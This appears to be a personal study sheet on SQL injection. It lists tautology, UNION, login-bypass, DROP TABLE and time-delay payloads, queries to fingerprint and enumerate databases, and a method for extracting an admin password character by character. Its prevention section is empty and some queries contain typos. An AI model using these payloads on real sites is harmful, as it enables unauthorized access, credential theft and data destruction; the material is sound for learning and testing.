# SQL Injection(SQLi)
SQL injection allows an attacker to make unwanted requested queries or modifications to the database.

Let's assume the server makes this query with user input. `SELECT * FROM users WHERE = 'userInput';`

If the user were to input `' OR 1=1; DROP TABLE users; --` the resulting query would be `SELECT * FROM users WHERE = '' OR 1=1; DROP TABLE users; -- ';`.

This attack allowed the user to drop the table when it should be allowed.
- `'` ended the user input's string
- `OR 1=1;` allowed the previous query to return true
- `--` commented the following `'` that was there from the server's query
	- Comments could sometime be `#`

## [Common SQLi attacks](#table-of-contents)
- `' OR 1=1; YOUR INJECTION HERE; --`
- `' UNION SELECT column FROM table; --`
	- When getting back a query you sometimes need an exact amount of columns. Use `, 1` to get this.
		- Ex: `' UNION SELECT column, 1, 1 FROM table; --` 3 columns

- `0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z`
	- Possibly bypasses filters

### [Logins](#table-of-contents)
Bypassing logins
- `SELECT id FROM users WHERE password = '' AND username = ''` or `SELECT id FROM users WHERE username = '' AND password = ''`
	- Whichever is first, username input or password input: `' OR 1=1; --`

`admin'--`
`administrator'--`

## [How do you know the website is using SQL?](#table-of-contents)
- Look for SQL keywords in source code which may tell you what they are using.
- Input single quote `'` and look for errors
- Input some SQL and see how that changes the responses. Ex: `ASCII(97)`
	- How does this work?

## [How do you know which SQL database is being used?](#table-of-contents)
- MySQL: `SELECT VERSION();`
- Postgres: `SELECT version();`
- SQL Server: `SELECT @@VERSION;`
- Oracle: `SELECT * FROM v$version`
- SQLite: `SELECT sqlite_version();`
	- https://www.techonthenet.com/sqlite/sys_tables/index.php
- IBM Db2: `SELECT * FROM sysibm.sysversions;`

## [How do you know what all the tables are in the db?](#table-of-contents)
- MySQL: `SHOW TABLES;`
- Postgres, SQL Server: `SELECT * FROM information_schema.tables`
- Oracle: `SELECT table_name FROM user_tables;`
- SQLite: `SELECT name FROM sqlite_master;`
- IBM Db2: `SELECT tabname FROM syscat.tables'`

## [How do you know what all the columns in a table are?](#table-of-contents)
- MySQL and Oracle: `DESCRIBE table_name;` or `SHOW COLUMNS FROM table_name;`
- Postgres, SQL Server: `SELECT COLUMN_NAME from information_schema.columns where table_name = 'table_name'`
- SQLite doesn't have this feature.
- IBM Db2: `SELECT colname FROM syscat.columns WHERE tabname = 'table_name';`

## [Types of SQLi](#table-of-contents)

### [Boolean based SQLi](#table-of-contents)
Boolean based SQLi happen when you only get a boolean value back from your SQLi and you have to extract information through this boolean value.
- Determine if it is a boolean based SQLi
	- The output from `' OR 1=1; --` is different from `' OR 1=2; --`

- `AND (SELECT 'a' FROM users WHEN username='admin')='a'; -- `
	- Returns 'a' when there is a admin username. Which returns true.
	- Used to find if there is that username in users
- `AND (SELECT substring(password,1,1) FROM users WHERE username='admin')='a'; --`
	- used to extract the password one character at a time from the admin user
	- Next time 'a' will be changed to 'b' etc
	- substring(column, index, length)
	- Used to guess and check one character at a time for the password
	- Useful when you are getting back boolean information, but need to reconstruct a string

- Look at the response differences between 

### [Blind SQLi](#table-of-contents)
Blind SQLi are where the attacker cannot see any responses, including errors, from the db.

- Time based attacks
	- Payloads designed to trigger time delays. Ex: `'; WAITFOR DELAY ('0:0:20');--` or `SELECT SLEEP(20);--`
- Out-of-bound network interactions - the attacker injects SQL which triggers the database to communicate with the attacker's server.

## [How to prevent SQLis](#table-of-contents)
- 

`SELECT * FROM products WHERE category = 'Gitfs' OR 1=1 --'`
	- Selects products which has the category of gifts or where 1=1(which is true). This results in returning all the products regardless of the category.
